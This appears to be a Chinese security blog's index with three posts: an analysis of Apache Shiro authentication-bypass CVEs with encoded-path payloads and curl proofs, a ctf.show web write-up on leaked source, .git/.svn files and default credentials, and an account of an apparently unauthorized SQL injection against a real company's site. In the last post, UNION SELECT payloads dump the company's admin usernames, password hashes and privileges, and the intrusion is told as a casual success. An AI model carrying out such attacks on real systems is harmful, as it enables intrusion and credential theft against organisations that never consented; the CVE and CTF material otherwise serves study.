由于处理身份验证请求时出错 存在 权限绕过漏洞，远程攻击者可以发送特制的<code>HTTP</code>请求，绕过身份验证过程并获得对应用程序的未授权访问<br>条件：<code>ant</code>风格的路径为<code>*</code>，而<code>**</code>无法绕过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们访问/admin/1时会被重定向到login页面，但是访问/admin/%3b1时就可以访问到资源。</p><p>shiro 方面：<br><code>getServletPath</code>方法将<code>%3b</code>进行了解码，返回<code>/admin/;1</code>，接着调用<code>removeSemicolon</code>，该方法查找<code>;</code>，并将<code>;</code>及其之后的部分删除，于是返回<code>/admin/</code>，此时shiro拦截器配置<code>*</code>，因为/admin/和/admin/* 不匹配，所以导致shiro验证绕过，后面直接放行了</p><p>spring方面：<br>spring对URL解码后返回<code>/admin/;1</code>，之后进行路径的匹配，最终匹配到正确可访问的路径</p><p>在1.6.0版本中，shiro加入了默认<code>/**</code>匹配的配置，防止遗漏</p><p>​       </p><h3 id="CVE-2020-17510-Apacheshiro-lt-1-7-0权限绕过漏洞"><a href="#CVE-2020-17510-Apacheshiro-lt-1-7-0权限绕过漏洞" class="headerlink" title="(CVE-2020-17510)Apacheshiro&lt;1.7.0权限绕过漏洞"></a>(CVE-2020-17510)Apacheshiro&lt;1.7.0权限绕过漏洞</h3><p>本漏洞还是对AntPathMatcher的绕过，在前面CVE-2020-11989和CVE-2020-13933分别尝试了<code>/</code>的双重URL编码和 <code>;</code> 的URL编码绕过，抓住Shiro与Spring对URI处理的差异化导致的构造的URL能突破过滤，访问需要验证的资源。</p><p>CVE-2020-17510使用<code>.</code>进行绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shiro拦截器部分配置：</span><br><span class="line">map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span><span class="comment">//路由</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin page&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设URL访问<code>/admin/%2e</code>当Shiro去除/和其后面字符获得的URI为<code>/admin</code>时，是无法和/hello/*匹配的，所以就在/admin后面加上<code>%2e</code>，这样Shiro解码之后变成<code>/admin/.</code>，然后路径标准化成为<code>/admin</code>，放行，这样就绕过身份验证了<br>随后进入spring，当Spring Boot版本在小于等于2.3.0.RELEASE的情况下， alwaysUseFullPath 为默认值false，这会使得其获取ServletPath，所以在路由匹配时相当于会进行路径标准化包括对 %2e 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 alwaysUseFullPath 自动配置成了true从而开启全路径，又可能导致一些安全问题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">在低版本spring boot下：</span><br><span class="line">$ curl -v &quot;http://127.0.0.1:8080/no-auth/%2e%2e/auth&quot;</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; GET /no-auth/%2e%2e/auth HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8080</span><br><span class="line">&gt; User-Agent: curl/7.64.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200</span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 4</span><br><span class="line">&lt; Date: Wed, 14 Apr 2021 13:22:03 GMT</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">auth</span><br><span class="line">* Closing connection 0</span><br><span class="line">   </span><br><span class="line">//因为%2e%2e造成跨目录访问成功。低版本对路径标准化包括对解码以及处理跨目录即如果存在则返回上一级目录</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">在高版本spring boot下：</span><br><span class="line">$ curl -v http://127.0.0.1:8080/admin/%2e</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; GET /admin/%2e HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8080</span><br><span class="line">&gt; User-Agent: curl/7.64.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200</span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 10</span><br><span class="line">&lt; Date: Wed, 14 Apr 2021 13:48:33 GMT</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">admin page* Closing connection 0</span><br><span class="line">//与CVE-2020-17510配合，造成未授权资源的访问</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="CVE-2020-17523-Apacheshiro-lt-1-7-1权限绕过漏洞"><a href="#CVE-2020-17523-Apacheshiro-lt-1-7-1权限绕过漏洞" class="headerlink" title="(CVE-2020-17523)Apacheshiro&lt;1.7.1权限绕过漏洞"></a>(CVE-2020-17523)Apacheshiro&lt;1.7.1权限绕过漏洞</h3><p>本漏洞使用<strong>编码空格</strong>的方式可以绕过验证。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shiro拦截器部分配置：</span><br><span class="line">map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span><span class="comment">//路由</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin page&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们访问<code>/admin/1</code>,会提示登录，但是访问<code>/admin/%20</code>就可以访问到资源<br>Shiro的校验uri的函数为<code>PathMatches</code>，当<code>PathMatches</code>返回<code>true</code>时才会进入鉴权。而在<code>trim()</code>函数去掉了空格，导致PathMatches<code>(&quot;/admin/*&quot;,&quot;/admin/ &quot;)</code> 匹配失败返回了 <code>false</code>，直接就是没有进行鉴权操作，shiro放行。而spring则可以访问正常</p><p>​      </p><h3 id="CVE-2021-41303-Apacheshiro-lt-1-8-0权限绕过漏洞"><a href="#CVE-2021-41303-Apacheshiro-lt-1-8-0权限绕过漏洞" class="headerlink" title="(CVE-2021-41303)Apacheshiro&lt;1.8.0权限绕过漏洞"></a>(CVE-2021-41303)Apacheshiro&lt;1.8.0权限绕过漏洞</h3><p>本漏洞通过对uri尾部添加<code>/</code>进行绕过</p><p>shiro在1.7.1的时候，对URI的处理是这样的，先是对pathPattern和requestURI进行比较，如果比较成功，返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChainManager.proxy(originalChain, pathPattern);</span><br></pre></td></tr></table></figure><p>如果不成功则对删除尾部斜线的pathPattern和requestURI进行比较，比较成功，跳出循环，返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChainManager.proxy(originalChain, requestURINoTrailingSlash);</span><br></pre></td></tr></table></figure><p>shiro鉴权是会按顺序进行匹配的，如果有以下配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/page&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的说我们访问<code>/admin/page/</code>，先与<code>/admin/*</code>匹配不成功，然后对URL去掉末尾斜杠之后再一次回到拦截器进行<code>/admin/page</code>的匹配，匹配成功”anon”，绕过成功。</p>]]></content>
      
      
      <categories>
          
          <category> 安全框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web练习题</title>
      <link href="/post/2/"/>
      <url>/post/2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>菜鸡小白，日常<strong>练练web</strong></p><h2 id="信息收集（1-20）"><a href="#信息收集（1-20）" class="headerlink" title="信息收集（1-20）"></a>信息收集（1-20）</h2><p>​       </p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>查看网站源码即可拿到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web1.png"></p><p>​       </p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>无法使用右键查看源代码，可以在 URL 前添加 <code>view-source:</code>查看源代码<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web2.png"></p><p>​      </p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>查看源码无果，尝试查看请求头与响应头，在响应头中看到了 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web3.png"></p><p>​      </p><p>使用BP抓包也是一样的效果    <img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web3%EF%BC%881%EF%BC%89.png"></p><p>​       </p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>题目提示robots:</p><blockquote><p>robots协议（也称爬虫协议，机器人协议等）的全称是“网络爬虫排除协议”，网站通过robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。规定只能小写且为 txt 文件</p></blockquote><p>访问网站的 robots.txt 看到放置 flag 的文件<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web4.png"></p><p>​          </p><p>访问放置 flag 的文件，看到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web4(1).png"></p><p>​         </p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>题目提示 phps 源码泄露，index.php 是当前页面，所以我们修改一下访问 index.phps </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1b24977f-7280-490e-a21f-377af3512a46.challenge.ctf.show/index.phps</span><br></pre></td></tr></table></figure><p>提示下载。我们下载后打开，即可看到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web5.png"></p><p>​          </p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>题目提示 “源码解压到当前目录，收工”  说明 <a href="http://www.zip/">www.zip</a> 压缩包还放在站点下，我们构造 URL 访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://574a895f-82cb-4bad-b6a4-df14e4f73843.challenge.ctf.show/www.zip</span><br></pre></td></tr></table></figure><p>下载，打开可以看到 fl000g.txt<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web6.png"></p><p>​          </p><p>但是这不是 flag，提交时显示错误，于是我们访问 fl000g.txt 得到真正的 flag </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://574a895f-82cb-4bad-b6a4-df14e4f73843.challenge.ctf.show/fl000g.txt</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>题目提示 “ 版本控制很重要，但不要部署到生产环境更重要 ”</p><p>由于我水平有限，版本控制系统 首先联想到的是 git，这题可能是有关 git 泄露问题</p><blockquote><p>在运行 git init 初始化代码库的时候，会在当前目录下面产生一个.git 的隐藏目录，用来记录代码的变更记录等等。<br>在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p></blockquote><p>于是访问 <code>.git/index.php</code> 构造 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5fc191d6-fc10-4e6b-8dd7-8257ad22c140.challenge.ctf.show/.git/index.php</span><br></pre></td></tr></table></figure><p>很巧就出了 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web7.png"></p><p>​      </p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>提示和 web7 一样，但使用同样的方式是行不通了。查阅资料有关 版本控制系统 的发现还有 SVN 源码泄露的漏洞，</p><blockquote><p>资料显示：<br>  在使用SVN(subversion)管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p></blockquote><p>与 git 相似，我们访问 .svn 构造 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f135f114-0527-457c-871d-0aec223a5913.challenge.ctf.show/.svn/</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web8.png"></p><p>​      </p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>题目提示 “ 使用vim 编辑时意外退出” ，所以是 vim 造成的泄露。</p><blockquote><p>资料显示：<br>vim是一款编辑工具，当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。意思就是使用vim 编辑 意外退出会产生临时文件</p><p>需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生<code>.swp</code>文件的。</p></blockquote><p>我们访问文件 <code>index.php.swp</code> 构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://872954f8-ed97-4e44-96b3-b6333548bd28.challenge.ctf.show/index.php.swp</span><br></pre></td></tr></table></figure><p>下载文件，打开即可看到 flag</p><p>​      </p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>题目提示 ”cookie“  所以我们查看本地存储的 cookie<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web10.png"></p><p>​       </p><p>进行一下 URL 解码，拿到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web10(1).png"></p><p>​       </p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>题目提示 “域名其实也可以隐藏信息，比如 ctfshow.com 就隐藏了一条信息”  和域名有关的信息收集</p><p>我们对该域名进行DNS检测 ，可用阿里云查询链接：<a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a><br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web11.png"></p><p>​       </p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>题目提示“有时候网站上的公开信息，就是管理员常用密码”  可能与管理员有关</p><p>查看是否有路径可拿，访问 robots.txt ,发现存在管理员的登录目录admin，访问，但需要账号密码。<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web12.png"></p><p>​       </p><p>根据提示，密码应该就在此网站公开，找到页脚，有一串数字，试试。<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web12(1).png"></p><p>​       </p><p>登录得到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web12(2).png"></p><p>​       </p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>题目提示 “技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码”</p><p>查找页面的可疑的文档，又是在页脚发现一个文件超链接<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web13.png"></p><p>​       </p><p>打开后发现是一个使用文档，有后台登录地址及身份<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web13(1).png"></p><p>​       </p><p>直接访问显示错误，我们将 your-domain 改为我们题目的链接，构造 URL ，访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://855583d1-b17f-4687-9201-361a2c8dfedb.challenge.ctf.show/system1103/login.php</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web13(2).png"></p><p>​       </p><p>登陆成功后即可看到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web13(3).png"></p><p>​       </p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>题目提示 “有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人”</p><p>所以我们直接访问 editor ，发现进入到了一个编辑界面 ，在编辑界面的这 3 个按钮中可以发现一个 文件空间<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web14.png"></p><p>点击文件空间可以发现可以进行 目录遍历<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web14(1).png"></p><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web14(2).png">        </p><p>寻找一番，发现 flag 在 var/www/html/nothinghere/fl000g.txt 下，于是构造 URL 访问 ,得到 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1bef8e6b-a152-4327-a454-c78e8bb52230.challenge.ctf.show/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web14(3).png"></p><p>​       </p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>题目提示 “公开的信息比如邮箱，可能造成信息泄露，产生严重后果”  在页脚发现一个邮箱，暂时还不知道思路</p><p>在 URL 尝试访问 admin，发现可以<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15.png"></p><p>​       </p><p>不知道账号密码，尝试 用户为 1 显示用户名错误，尝试 用户为 admin 显示密码错误，所以 admin账户存在</p><p>我们点击忘记密码，发现有密保 “我的所在地是哪个城市？”<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15(1).png"></p><p>​       </p><p>这可把我整蒙了。这和邮箱有什么关系？？ 随后发觉这是个QQ邮箱，于是搜索该QQ号，发现城市名是 西安<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15(2).png"></p><p>重置密码成功<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15(3).png"></p><p>然后我们就可以开开心心登陆后台了，拿到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web15(4).png"></p><p>​       </p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>题目提示 “对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露” 所以跟探针有关</p><blockquote><p>资料显示：<br>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。<br>比如查看服务器支持什么，不支持什么，空间速度等等状况！</p></blockquote><p>本题与探针有关，尝试访问 <code>tz.php</code>  构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9ef070e8-9da7-4f0e-b4f6-9f49f0cf58f0.challenge.ctf.show/tz.php</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web16.png"></p><p>点击 PHPINFO<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web16(1).png"></p><p>在页面内寻找 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web16(2).png"></p><p>​       </p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>题目提示 查找 ctfer.com 的真实 IP</p><p>使用 fofa 查找即可<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web17.png"></p><p>​       </p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>打开本关卡是一个小游戏，查看它的 JS 代码，当分数高大于100时会输出一串东西<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web18.png"></p><p>​       </p><p>将编码拿去Unicode解码一下<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web18(1).png"></p><p>​       </p><p>根据 “你赢了，去幺幺零点皮爱吃皮看看”提示，访问 <code>110.php</code>  构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c942730e-776b-45cd-bcd4-573d4368b08e.challenge.ctf.show/110.php</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web18(2).png"></p><p>​        </p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>题目提示 “密钥什么的，就不要放在前端了”</p><p>查看源码发现一些信息，显示如果  post 请求满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br></pre></td></tr></table></figure><p> 就能打印出 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web19.png"></p><p>​       </p><p>于是构造 post 请求，拿到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web19(1).png"></p><p>​       </p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>题目提示“mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了”  跟mdb文件泄露有关</p><p>搜索资料过后发现： 直接查看 URL 路径添加 /db/db.mdb </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ad92e72a-2c61-4ae7-a0d1-e3b4761affbc.challenge.ctf.show/db/db.mdb</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web20.png"></p><p>​       </p><p>下载文件通过 txt 打开，搜索 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web20(1).png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对某公司渗透实测</title>
      <link href="/post/1/"/>
      <url>/post/1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这阵子练习太多的CTF有点乏了，打算回头看看老本行，但是碍于本人太菜了😭，只能找找相对简单，大师傅们不屑一顾的站点，于是乎在我不经意间发现了某公司网站</p><h2 id="漏掉的点"><a href="#漏掉的点" class="headerlink" title="漏掉的点"></a>漏掉的点</h2><p>起初我是奔着弱口令去的，但对该公司的后台管理系统疯狂尝试了半天后无果，你以为我就这样放弃了吗？<del>那你真的是猜的很准</del>。</p><p>于是我又回到公司主页，随手在url 里添加了id 参数，不试不知道，一试吓一跳。当将数值取1 时页面有反馈    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/3575.png">    </p><p>​     </p><h2 id="尝试注入"><a href="#尝试注入" class="headerlink" title="尝试注入"></a>尝试注入</h2><p>在发现参数可改且有不同反馈之后进行下一步测试</p><p>先试试不考虑过滤的查显示位 sql 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/3576.png">    </p><p>意不意外，惊不惊喜？该公司网站并没有对敏感字符做过滤，于是乎我们就查到了一些数据库里的信息。</p><p>发现数据库中存在 admin表，表中有 id,username,password,quanxian 参数</p><p>​       </p><p>废话不多说，赶紧看一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(concat(id,<span class="number">0x7e</span>,username,<span class="number">0x3A</span>,password,<span class="number">0x3A</span>,quanxian,<span class="number">0x7e</span>)) <span class="keyword">from</span> admin),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/3577.png"></p><p>可以看到用户名为 nie 的具有admin权限，心里美滋滋，解密后就可以登录后台啦嘿嘿。密码是加密过的</p><p>​       </p><p>于是反手就是丢解密工具里去了。。。。。。</p><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/71609.png"></p><p>​               真服了。。。。。。</p><p>​                                                            <img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/0g9nf.jpg"></p><p>​           既然解密未果，那此次的渗透就到此为止啦 ~</p><p>​         </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>对目标漏洞的寻找要全方位，不放过任何一个细节</strong></p><div align="center"> 好啦，又水一个洞 </font>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
